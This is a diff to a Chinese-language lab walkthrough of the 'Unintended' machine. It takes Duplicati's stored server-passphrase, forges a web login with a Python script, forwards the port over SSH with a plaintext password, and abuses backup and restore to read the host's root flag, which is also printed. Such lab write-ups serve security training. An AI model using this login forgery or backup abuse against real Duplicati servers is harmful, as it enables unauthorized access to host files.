@@ -2558,6 +2558,8 @@ ftp> get duplicati-ie324293d766446ddbe27823f52e30d4c.dindex.zip
 ## 发现凭据
 > /duplicati/config/Duplicati-server.sqlite
 >
+> 我们拿到了server-passphrase 这方便我们后续进行密码解密
+>
 
 ```plain
 ┌──(web)─(root㉿kali)-[/home/…/Unintended/web/duplicati/config]
@@ -2573,8 +2575,25 @@ sqlite> select * from Option;
 -2||last-update-check|638417625259706730
 ```
 
+## 端口转发
+> 回顾10.13.38.59机器，我们发现它开放了Duplicati端口8200，将他转发到本地
+>
+
+```plain
+┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Unintended]
+└─# sshpass -p 'theJUANman2019' ssh -N -L 8200:127.0.0.1:8200 -l 'juan@unintended.vl' 10.13.38.59
+```
+
+## web访问
+> 访问[http://127.0.0.1:8200/login.html](http://127.0.0.1:8200/login.html)
+>
+
+![](/image/hackthebox-prolabs/Unintended-1.png)
+
 ## 登录 Duplicati
-事实证明，我们可以通过知道服务器密码来登录网页界面
+事实证明，我们可以通过知道服务器密码来登录网页界面。有一篇文章详细解释了这次袭击
+
+[Vulnlab - Unintended](https://blog.apolloteapot.com/vulnlab-unintended)
 
 认证的工作原理是：
 
@@ -2586,80 +2605,126 @@ sqlite> select * from Option;
 这里有一个Duplicati自动化登录的脚本：
 
 ```plain
+#!/usr/bin/env python3
 import requests
 import base64
 import hashlib
+import json
 
-server_passphrase = 'ZhB5vA+1uCde2Gozh9/CXKfPt8MoNcUklyfk1vBuuQk='
-
-# Set headers with proper Host
-headers = {
-    'Host': 'web.unintended.vl:8200'
-}
+base = "http://127.0.0.1:8200"
+server_passphrase = "ZhB5vA+1uCde2Gozh9/CXKfPt8MoNcUklyfk1vBuuQk="
 
 s = requests.Session()
-s.headers.update(headers)
-s.get('http://web.unintended.vl:8200/login.html')
 
-# Get nonce
-r = s.post('http://web.unintended.vl:8200/login.cgi', data = {
-    'get-nonce': 1
-})
+headers = {
+    "Referer": f"{base}/login.html",
+    "Origin": base,
+    "X-Requested-With": "XMLHttpRequest",
+}
 
-print(f"Status: {r.status_code}")
-print(f"Headers: {dict(r.headers)}")
-print(f"Raw content (first 500 bytes): {r.content[:500]}")
-print(f"Text content: {repr(r.text[:500])}")
+s.get(f"{base}/login.html")
 
-# Decode with utf-8-sig to strip BOM if present
-response_text = r.content.decode('utf-8-sig')
-nonce_data = json.loads(response_text)
-nonce = nonce_data['Nonce']
+r = s.post(f"{base}/login.cgi", data={"get-nonce": "1"}, headers=headers)
+data = json.loads(r.content.decode("utf-8-sig"))
+nonce = data["Nonce"]
 
-# Compute noncedpwd
-saltedpwd_bin = base64.b64decode(server_passphrase)
-noncedpwd = base64.b64encode(hashlib.sha256(base64.b64decode(nonce) + saltedpwd_bin).digest()).decode()
+print("[+] Nonce:", nonce)
 
-# Login with noncedpwd
-r = s.post('http://web.unintended.vl:8200/login.cgi', data = {
-    'password': noncedpwd
-})
+s.cookies.set("session-nonce", nonce, path="/")
 
-from urllib.parse import unquote
+noncedpwd = base64.b64encode(
+    hashlib.sha256(
+        base64.b64decode(nonce) + base64.b64decode(server_passphrase)
+    ).digest()
+).decode()
 
-print(f'Status code: {r.status_code}')
-print(f'\nCookies décodés:')
-print('-' * 80)
-print(f'{"Cookie Name":<20} | {"Decoded Value"}')
-print('-' * 80)
+print("[+] noncedpwd:", noncedpwd)
 
-for cookie in s.cookies:
-    decoded_value = unquote(cookie.value)
-    print(f'{cookie.name:<20} | {decoded_value}')
+r = s.post(
+    f"{base}/login.cgi",
+    data={"password": noncedpwd},
+    headers=headers,
+    cookies={"session-nonce": nonce},
+)
+
+print("[+] Status:", r.status_code)
+print("[+] Response headers:", dict(r.headers))
+print("[+] Response text:", repr(r.text))
+print("[+] Session cookies:", s.cookies.get_dict())
+print("[+] Response cookies:", r.cookies.get_dict())
 ```
 
 ### 获得cookie
 > 获得cookie后修改自身cookie
 >
-> 再次导航后 [http://web.unintended.vl:8200/](http://web.unintended.vl:8200/) ，我们将成功登录！
+> 再次导航后 [http://127.0.0.1:8200/ngax/index.html](http://127.0.0.1:8200/ngax/index.html) ，我们将成功登录！
 >
 
 ```plain
-┌──(web)─(root㉿kali)-[/home/…/Desktop/htb/Unintended]
-└─# python login.py
-Status code: 200
-Cookies: <RequestsCookieJar[<Cookie xsrf-token=... for web.unintended.vl/>, <Cookie session-nonce=... for web.unintended.vl/>, <Cookie session-auth=... for web.unintended.vl/>]>
+┌──(web)─(root㉿kali)-[/home/kali/Desktop/htb/Unintended]
+└─# python3 login.py                
+[+] Nonce: RZAAyf320htuIehpjIPxCpQmYaQa/PZ9Vqr5x+vve4Y=
+[+] noncedpwd: BMPrlxPFip9xi512qNYWN5NySHoB3BRWKzc0X7jF6ys=
+[+] Status: 200
+[+] Response headers: {'Cache-Control': 'no-cache, no-store, must-revalidate, max-age=0', 'Date': 'Wed, 08 Apr 2026 06:44:25 GMT', 'Content-Length': '23', 'Content-Type': 'application/json', 'Server': 'Tiny WebServer', 'Keep-Alive': 'timeout=20, max=400', 'Connection': 'Keep-Alive', 'Set-Cookie': 'xsrf-token=%2B3eQvwJd9HfAN0h4qB41miHyo4NAYqnO3D984j%2BFpEU%3D; expires=Wed, 08 Apr 2026 06:54:25 GMT;path=/; , session-auth=5T_z1emshleY6bNO7Cmvj5IEqTV2QzWJ1P5q_UfjP20; expires=Wed, 08 Apr 2026 07:44:25 GMT;path=/; '}
+[+] Response text: '\ufeff{\n  "Status": "OK"\n}'
+[+] Session cookies: {'session-nonce': 'RZAAyf320htuIehpjIPxCpQmYaQa/PZ9Vqr5x+vve4Y='}
+[+] Response cookies: {}
 ```
 
-## 用备份和还原时读取旗帜
-主机的根文件系统挂载在 Duplicati 容器的 /source 处，允许我们将主机上的任何文件备份到任意位置。
+```plain
+curl -i http://127.0.0.1:8200/ngax/index.html \
+  -H 'Cookie: session-auth=xxxxxxx; xsrf-token=xxxxxxx; session-nonce=xxxxxxx; default-theme=ngax'
+```
 
-我们先把 /source/root/flag.txt 备份到 /source/tmp/flag，然后恢复它：
+![](/image/hackthebox-prolabs/Unintended-2.png)
+
+## 用备份和还原时读取旗帜
+我们试着添加一个新的备份：
+
+![](/image/hackthebox-prolabs/Unintended-3.png)
+
+![](/image/hackthebox-prolabs/Unintended-4.png)
+
+我们注意到主机的根文件系统挂载在 Duplicati 容器的 `/source` 处，允许我们将主机上的任何文件备份到任意位置：  
+让我们把 `/source/root/flag.txt` 备份到 `/source/tmp/flag`：
+
+![](/image/hackthebox-prolabs/Unintended-5.png)
+
+![](/image/hackthebox-prolabs/Unintended-6.png)  
+保持预_约_和_选项_的默认设置。  
+点击_立即运行_以获取新添加的备份：
+
+![](/image/hackthebox-prolabs/Unintended-7.png)  
+备份运行后，我们可以在 WEB 上的 SSH 会话中检查创建的文件，格式如下：
+
+```plain
+juan@unintended.vl@web:/tmp/flag$ dir
+duplicati-20260408T070215Z.dlist.zip                    duplicati-iaa43c622710947bfbf29f3bb1fc252c3.dindex.zip
+duplicati-b634109aacf85475a956bbff4a11cdf19.dblock.zip
+```
+
+现在点击 _“恢复文件”..._
+
+![](/image/hackthebox-prolabs/Unintended-8.png)
+
+将文件（标志）恢复为 `/source/tmp/flag`：
+
+![](/image/hackthebox-prolabs/Unintended-9.png)
+
+![](/image/hackthebox-prolabs/Unintended-10.png)
+
+![](/image/hackthebox-prolabs/Unintended-11.png)
 
 恢复后，我们可以读到旗帜：
 
 ```plain
-juan@unintended.vl@web:~$ cat /tmp/flag/flag.txt
-unintended{...}
+juan@unintended.vl@web:/tmp/flag$ ls
+duplicati-20260408T070215Z.dlist.zip                    duplicati-iaa43c622710947bfbf29f3bb1fc252c3.dindex.zip
+duplicati-b634109aacf85475a956bbff4a11cdf19.dblock.zip  flag.txt
 ```
 
+```plain
+juan@unintended.vl@web:/tmp/flag$ cat flag.txt 
+UNINTENDED{c182b2c2fb66201d66355ba4804943ed}
+```
